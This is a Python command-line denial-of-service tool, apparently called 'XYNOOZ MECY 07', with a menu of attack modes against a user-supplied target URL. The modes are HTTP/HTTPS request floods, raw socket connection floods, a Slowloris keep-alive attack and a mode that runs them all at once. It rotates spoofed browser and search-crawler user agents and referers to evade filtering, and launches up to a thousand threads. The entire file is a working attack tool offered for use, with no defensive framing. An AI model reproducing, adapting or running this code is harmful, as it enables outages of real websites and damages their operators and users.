#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import random
import socket
import ssl
import threading
import time
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Warna biar aesthetic
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ASCII ART + Banner
BANNER = f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════╗
║  █░█ █░█ ▀▀▀█░█▀▄ ▄▀▄ ▄▀▀                              ║
║  ▀▄▀ ▄▀▄ ░▄▀░░█░█ █░█ ░▀▄                              ║
║  ░▀░ ▀░▀ ▀▀▀▀░▀▀░ ░▀░ ▀▀░                              ║
╠══════════════════════════════════════════════════════════╣
║  {CYAN}Version 1.0 | Developer: Izumi Kece{RESET}{RED}                    ║
║  {YELLOW}XYNOOZ MECY 07 Core | No Filter | Unlimited Power{RESET}{RED}    ║
╚══════════════════════════════════════════════════════════╝
{RESET}
"""

MENU = f"""
{BLUE}{BOLD}╔══════════════════════════════════════════════════════════╗
║                    {WHITE}ATTACK MODE SELECTION{RESET}{BLUE}                     ║
╠══════════════════════════════════════════════════════════╣
║  {GREEN}[1]{RESET}{BLUE}  DDoS - HTTP/HTTPS Flood (Layer 7)              ║
║  {GREEN}[2]{RESET}{BLUE}  DoS  - Single Target Massive Request           ║
║  {GREEN}[3]{RESET}{BLUE}  Flood - Raw Socket Connection Flood            ║
║  {GREEN}[4]{RESET}{BLUE}  HTTP - HTTP Request Flood (Lightning Mode)     ║
║  {GREEN}[5]{RESET}{BLUE}  HTTPS - SSL/TLS Handshake Flood                ║
║  {GREEN}[6]{RESET}{BLUE}  Slowloris - Keep Connection Alive Attack       ║
║  {GREEN}[7]{RESET}{BLUE}  ALL MODE - Activate All Attacks Simultaneously ║
╠══════════════════════════════════════════════════════════╣
║  {RED}[0]{RESET}{BLUE}  Exit & Self Destruct                           ║
╚══════════════════════════════════════════════════════════╝
{RESET}
"""

# Database User Agent (100+ random)
USER_AGENTS = [
    # Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    
    # Android
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36",
    
    # iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    
    # Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.234 Safari/537.36",
    
    # Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.109 Safari/537.36",
    
    # Bot/Crawler
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    
    # Custom
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
]

REFERERS = [
    "https://google.com",
    "https://bing.com",
    "https://yahoo.com",
    "https://yandex.com",
    "https://duckduckgo.com",
    "https://facebook.com",
    "https://twitter.com",
    "https://instagram.com",
    "https://tiktok.com",
    "https://youtube.com",
    "https://reddit.com",
    "https://github.com"
]

attack_active = True
request_count = 0
lock = threading.Lock()

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Referer": random.choice(REFERERS),
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1"
    }

def increment_count():
    global request_count
    with lock:
        request_count += 1

def print_stats():
    global request_count
    while attack_active:
        time.sleep(3)
        print(f"{GREEN}[📊] Total Requests: {request_count} | Time: {time.strftime('%H:%M:%S')} | Status: {BOLD}RAINING HELL{RESET}")

# Attack Mode 1: DDoS Flood
def ddos_flood(target_url, threads):
    global attack_active
    session = requests.Session()
    while attack_active:
        try:
            headers = get_random_headers()
            resp = session.get(target_url, headers=headers, timeout=5, verify=False)
            increment_count()
            print(f"{CYAN}[DDoS] Status: {resp.status_code} | UA: {headers['User-Agent'][:30]}...{RESET}")
        except Exception as e:
            increment_count()
            print(f"{YELLOW}[DDoS] Failed: {str(e)[:50]}{RESET}")

# Attack Mode 2: DoS Massive
def dos_flood(target_url, threads):
    global attack_active
    while attack_active:
        try:
            headers = get_random_headers()
            response = requests.get(target_url, headers=headers, timeout=3, verify=False)
            increment_count()
            print(f"{RED}[DoS] Hit! Status: {response.status_code}{RESET}")
        except:
            increment_count()
            print(f"{RED}[DoS] Connection Reset{RESET}")

# Attack Mode 3: Raw Socket Flood
def raw_socket_flood(target, port, threads):
    global attack_active
    while attack_active:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            sock.sendto((f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n").encode(), (target, port))
            increment_count()
            sock.close()
            print(f"{PURPLE}[Socket] Connection made to {target}:{port}{RESET}")
        except:
            increment_count()
            print(f"{PURPLE}[Socket] Connection failed{RESET}")

# Attack Mode 4: HTTP Flood
def http_flood(target_url, threads):
    global attack_active
    while attack_active:
        try:
            headers = get_random_headers()
            r = requests.get(target_url, headers=headers, timeout=3, verify=False)
            increment_count()
            print(f"{BLUE}[HTTP] {r.status_code} | Sent!{RESET}")
        except:
            increment_count()
            print(f"{BLUE}[HTTP] Request sent (no response){RESET}")

# Attack Mode 5: HTTPS Flood
def https_flood(target_url, threads):
    global attack_active
    session = requests.Session()
    while attack_active:
        try:
            headers = get_random_headers()
            resp = session.get(target_url, headers=headers, timeout=5, verify=False)
            increment_count()
            print(f"{GREEN}[HTTPS] SSL Hit! Status: {resp.status_code}{RESET}")
        except:
            increment_count()
            print(f"{GREEN}[HTTPS] SSL Handshake sent{RESET}")

# Attack Mode 6: Slowloris
def slowloris_attack(target, port, threads):
    global attack_active
    sockets = []
    while attack_active and len(sockets) < threads:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target, port))
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            sock.send("Accept-language: en-US,en\r\n".encode())
            sockets.append(sock)
            print(f"{YELLOW}[Slowloris] Connection {len(sockets)} opened{RESET}")
        except:
            pass
        
        # Keep connections alive
        for sock in sockets:
            try:
                sock.send(f"X-{random.randint(1, 5000)}: {random.randint(1, 5000)}\r\n".encode())
                increment_count()
            except:
                sockets.remove(sock)
        
        time.sleep(10)

def get_target_info():
    print(f"{CYAN}{BOLD}")
    url = input("[?] Enter Target URL (http/https): ").strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    
    threads = int(input("[?] Number of Threads (100-1000): "))
    duration = input("[?] Attack Duration in seconds (0 for unlimited): ")
    duration = int(duration) if duration.isdigit() else 0
    
    return url, threads, duration

def start_attack(mode, target_url, threads, duration):
    global attack_active
    attack_active = True
    
    # Parse target
    if "://" in target_url:
        protocol, domain = target_url.split("://")
        target = domain.split("/")[0]
        port = 443 if protocol == "https" else 80
    else:
        target = target_url.split("/")[0]
        port = 443 if "https" in mode.lower() else 80
    
    print(f"\n{RED}{BOLD}")
    print("╔══════════════════════════════════════════════════════════╗")
    print(f"║  Target: {target}:{port}                                    ║")
    print(f"║  Threads: {threads}                                        ║")
    print(f"║  Mode: {mode.upper()}                                           ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"{RESET}\n")
    
    # Start stats thread
    stats_thread = threading.Thread(target=print_stats)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Launch attack threads
    attack_threads = []
    for i in range(threads):
        if mode == "ddos":
            t = threading.Thread(target=ddos_flood, args=(target_url, threads))
        elif mode == "dos":
            t = threading.Thread(target=dos_flood, args=(target_url, threads))
        elif mode == "flood":
            t = threading.Thread(target=raw_socket_flood, args=(target, port, threads))
        elif mode == "http":
            t = threading.Thread(target=http_flood, args=(target_url, threads))
        elif mode == "https":
            t = threading.Thread(target=https_flood, args=(target_url, threads))
        elif mode == "slowloris":
            t = threading.Thread(target=slowloris_attack, args=(target, port, threads))
            break  # Slowloris hanya butuh satu thread buat manage connections
        else:
            return
        
        t.daemon = True
        t.start()
        attack_threads.append(t)
        time.sleep(0.05)  # Biar gak overload CPU
    
    print(f"{RED}[💀] ATTACK LAUNCHED! Press CTRL+C to stop...{RESET}\n")
    
    if duration > 0:
        time.sleep(duration)
        attack_active = False
        print(f"\n{RED}[🛑] Attack finished after {duration} seconds{RESET}")
    else:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            attack_active = False
            print(f"\n{RED}[🛑] Attack stopped by user{RESET}")
    
    print(f"{GREEN}[✓] Total requests sent: {request_count}{RESET}")

def main():
    clear_screen()
    print(BANNER)
    
    while True:
        print(MENU)
        choice = input(f"{YELLOW}[?] Select Mode (0-7): {RESET}").strip()
        
        if choice == "0":
            print(f"{RED}[💀] Exiting... Izumi out!{RESET}")
            sys.exit(0)
        
        modes = {
            "1": "ddos",
            "2": "dos",
            "3": "flood",
            "4": "http",
            "5": "https",
            "6": "slowloris",
            "7": "all"
        }
        
        if choice in modes:
            if choice == "7":
                # All mode - attack dengan semua metode
                print(f"{RED}[⚠] ALL MODE ACTIVATED - This will use massive resources{RESET}")
                target_url, threads, duration = get_target_info()
                print(f"{RED}[💀] Launching ALL attacks simultaneously...{RESET}")
                
                for mode in ["ddos", "dos", "flood", "http", "https"]:
                    attack_active = True
                    t = threading.Thread(target=start_attack, args=(mode, target_url, threads//5, duration))
                    t.daemon = True
                    t.start()
                
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    attack_active = False
                    print(f"\n{RED}[🛑] All attacks stopped{RESET}")
            else:
                target_url, threads, duration = get_target_info()
                start_attack(modes[choice], target_url, threads, duration)
        else:
            print(f"{RED}[!] Invalid choice, kontol!{RESET}")
            time.sleep(1)
            clear_screen()
            print(BANNER)

if __name__ == "__main__":
    main()